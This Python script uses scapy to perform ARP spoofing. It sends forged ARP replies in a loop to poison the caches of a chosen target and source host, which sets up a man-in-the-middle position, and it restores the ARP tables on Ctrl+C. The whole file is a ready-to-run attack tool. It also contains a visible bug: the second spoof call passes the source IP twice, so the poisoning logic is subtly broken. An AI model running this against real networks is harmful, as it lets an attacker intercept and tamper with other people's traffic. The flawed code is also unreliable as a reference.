#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse
# import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request   #Binding Broadcast with ARP
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', dest='target_ip', help='Target IP')
parser.add_argument('-s', '--source', dest='source_ip', help='Source IP')
arguments = parser.parse_args()

try:
    sent_packets_count = 0
    while True:
        spoof(arguments.target_ip, arguments.source_ip)
        spoof(arguments.source_ip, arguments.source_ip)
        sent_packets_count += 2
        print('\r[+] Packets Sent: ' + str(sent_packets_count), end='')
        # sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[-] Detected Ctrl + C.....Restoring ARP Table')
    restore(arguments.target_ip, arguments.source_ip)
    print('[+] Restored!')